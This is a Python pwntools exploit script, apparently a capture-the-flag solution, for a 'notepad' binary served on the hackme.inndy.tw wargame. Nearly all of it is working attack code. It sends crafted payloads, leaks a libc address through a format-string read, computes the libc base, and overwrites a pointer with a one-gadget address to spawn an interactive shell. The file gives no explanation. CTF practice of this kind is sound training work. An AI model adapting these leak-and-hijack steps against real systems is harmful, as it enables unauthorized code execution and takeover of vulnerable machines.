#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'niexinming'

from pwn import *
context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'linux', log_level = 'debug')

localMAGIC = 0x3ac5c      #locallibc
remoteMAGIC = 0x3ac3e      #remotelibc   #libc6_2.23-0ubuntu3_i386.so

def debug(addr = '0x8048ce8'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)

def base_addr(prog_addr,offset):
    return eval(prog_addr)-offset

elf = ELF('/home/h11p/hackme/notepad')
printf_addr=elf.plt['printf']
print 'printf_addr:'+hex(printf_addr)
strncpy_addr=elf.plt['strncpy']
print 'strncpy_addr:'+hex(strncpy_addr)
printf_got_addr=elf.got['printf']
print 'printf_got_addr:'+hex(printf_got_addr)

#io = process('/home/h11p/hackme/notepad')
io = remote('hackme.inndy.tw', 7713)


payload1='a'*4+p32(printf_addr)+p32(strncpy_addr)+'a'*3

#debug()
io.recvuntil('::> ')
io.sendline('c')
io.recvuntil('::>')
io.sendline('a')
io.recvuntil('size > ')
io.sendline('16')
io.recvuntil('data > ')
io.send(payload1)

io.recvuntil('::> ')
io.sendline('a')
io.recvuntil('size > ')
io.sendline('16')
io.recvuntil('data > ')
io.send('a'*15)

io.recvuntil('::> ')
io.sendline('b')
io.recvuntil('id > ')
io.sendline('1')
io.recvuntil('edit (Y/n)')
io.sendline(p32(0x59))
io.recvuntil('content > ')
io.sendline('%1067$p')
io.recvuntil('::> ')
io.sendline(p32(93))


io.recvuntil('::> ')
io.sendline('b')
io.recvuntil('id > ')
io.sendline('1')
io.recvuntil('::> ')
io.sendline(p32(92))
libc_start_main_247=io.recv().splitlines()[0]
libc_start_main=base_addr(libc_start_main_247,0xf7)
print "libc_start_main:"+hex(libc_start_main)

#local_libc_base=base_addr(libc_start_main_247,0x18637)
#print "libc_base:"+hex(local_libc_base)

remote_libc_base=base_addr(libc_start_main_247,0x18637)
print "libc_base:"+hex(remote_libc_base)


#MAGIC_addr=local_libc_base+localMAGIC
MAGIC_addr=remote_libc_base+remoteMAGIC
payload2=p32(MAGIC_addr)
print "MAGIC_addr:"+hex(MAGIC_addr)
#io.recv()
io.sendline('b')
io.recvuntil('id > ')
io.sendline('0')
io.recvuntil('edit (Y/n)')
io.sendline('Y')
io.recvuntil('content > ')
io.sendline(payload2)
io.recvuntil('::> ')
io.sendline('a')

io.recvuntil('::> ')
io.sendline('b')
io.recvuntil('id > ')
io.sendline('1')
io.recvuntil('::> ')
io.sendline(p32(91))

io.interactive()
io.close()

